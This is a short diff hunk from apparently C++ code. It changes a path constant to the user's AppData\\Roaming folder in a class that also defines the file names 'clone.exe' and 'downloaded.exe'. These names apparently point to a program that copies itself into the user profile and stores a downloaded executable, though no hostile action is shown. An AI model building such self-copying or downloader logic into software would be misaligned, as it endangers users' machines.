@@ -12,7 +12,7 @@ class UTIL {
 	string path;
 	string username;
 	string base = "C:\\Users\\";
-	string appData = "\\AppData";
+	string appData = "\\AppData\\Roaming";
 	string clone = "\\clone.exe";
 	string downloadFileName = "downloaded.exe";
 	string downloaded = "\\" + downloadFileName;
